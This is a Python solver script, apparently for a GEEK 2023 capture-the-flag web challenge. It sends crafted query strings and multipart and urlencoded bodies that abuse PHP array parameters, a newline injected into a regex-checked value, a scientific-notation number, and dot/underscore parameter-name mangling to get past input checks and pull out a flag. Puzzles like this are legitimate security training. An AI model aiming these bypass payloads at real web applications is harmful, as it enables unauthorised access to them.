import urllib.request, re, html as _html, uuid

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'

def try_raw(label, post_body, content_type='application/x-www-form-urlencoded'):
    full_url = url + '?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1'
    req = urllib.request.Request(full_url, data=post_body, headers={
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': content_type
    })
    resp = urllib.request.urlopen(req, timeout=10)
    body = _html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
    idx = body.find('?>')
    text = body[idx+2:].strip() if idx > 0 else ''
    for pat in ['flag{', 'CTF{', 'ISCC{', 'Geesec{', 'GEEK{']:
        if pat in text:
            i = text.find(pat); e = text.find('}', i)
            if e > i:
                print(f"FLAG: {text[i:e+1]} ({label})")
                return True
    short = text.replace('\xa0',' ')[:80]
    print(f"[{label}] -> {short}")
    return False

# multipart/form-data with dot in name
boundary = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
mp = (
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="qw[]"\r\n\r\na\r\n'
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="yxx[]"\r\n\r\nb\r\n'
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="SYC_GEEK.2023"\r\n\r\nHappy to see you!\r\n'
    f'--{boundary}--\r\n'
).encode('utf-8')
try_raw('multipart dot', mp, f'multipart/form-data; boundary={boundary}')

# Try with underscore instead
mp2 = (
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="qw[]"\r\n\r\na\r\n'
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="yxx[]"\r\n\r\nb\r\n'
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="SYC_GEEK_2023"\r\n\r\nHappy to see you!\r\n'
    f'--{boundary}--\r\n'
).encode('utf-8')
try_raw('multipart underscore', mp2, f'multipart/form-data; boundary={boundary}')

# Try bracket notation in multipart
mp3 = (
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="qw[]"\r\n\r\na\r\n'
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="yxx[]"\r\n\r\nb\r\n'
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="SYC_GEEK[2023]"\r\n\r\nHappy to see you!\r\n'
    f'--{boundary}--\r\n'
).encode('utf-8')
try_raw('multipart bracket', mp3, f'multipart/form-data; boundary={boundary}')

# urlencoded with raw bytes (no urllib.urlencode)
raw = b'qw[]=a&yxx[]=b&SYC_GEEK.2023=Happy+to+see+you%21'
try_raw('raw bytes dot', raw)
